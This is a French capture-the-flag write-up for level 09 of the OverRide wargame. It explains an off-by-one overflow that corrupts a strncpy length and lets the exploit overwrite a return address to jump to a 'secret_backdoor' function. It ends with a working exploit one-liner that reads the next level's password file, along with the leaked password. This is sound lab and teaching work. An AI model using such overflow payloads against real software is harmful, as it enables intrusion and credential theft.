# Level 09

On remarque que la boucle qui écrit le username au buffer principale écrit au maximum 41 caractères dans celui-ci. Ce qui n'as pas l'air d'être le comportement attendu par le developpeur du code, puisque qu'il se sert de tout ce qui il y a après le 40ème caractère pour autre chose. Ce qui nous laisse écrire 1 caractère dans ce 'autre chose'. C'est là la faille de sécurité. Le programme vérifie la valeur maximale de son itérateur AVANT de l'incrémenter. Une faute facile à faire lorsque l'on ne prend pas garde. (ou alors le dev est mal intentioné, ce qui à l'air d'être le cas car il a écrit une fonction pas du tout suspecte nommée `secret_backdoor` 😂)

Et c'est définitivement une faute grave car les caractères qui suivent le 40ème sont utilisés pour déterminé la taille fournit à un appel à la fonction `strncpy`, dans la fonction `set_msg`.

Cette fonction prend comme destination le buffer principal et comme source le buffer ayant reçu notre entrée pour le message.
Nous savons que le buffer principal fait 192 caractères de long. Il nous suffit donc de construire un payload exploitant la faille sus-mentionnée en dépassant la taille du buffer principale pour atteindre l'adresse de retour de la fonction `handle_msg`. Nous y écrirons l'addresse de la fonction `secret_backdoor` qui nous laissera appeler la commande de notre choix avec un appel à `system`.

```bash
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xd0"'; python -c 'print "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1]'; echo "cat /home/users/end/.pass" ) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```